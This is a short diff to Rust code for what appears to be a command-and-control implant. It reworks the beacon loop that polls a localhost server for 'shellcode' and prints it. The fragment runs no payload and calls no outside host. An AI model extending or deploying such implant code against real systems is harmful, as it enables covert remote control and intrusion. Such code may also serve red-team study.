@@ -50,11 +50,10 @@ impl Implant {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut implant = Implant::connect("http://[::1]:50055").await?;
 
-    let mut interval = time::interval(Duration::from_millis(implant.heartbeat.into()));
     loop {
-        interval.tick().await;
+        time::sleep(Duration::from_millis(implant.heartbeat.into())).await;
 
-        if let Some(s) = implant.poll().await? {
+        if let Some(s) = implant.poll().await.expect("Fail") {
             println!("Shellcode: {s}");
         }
     }
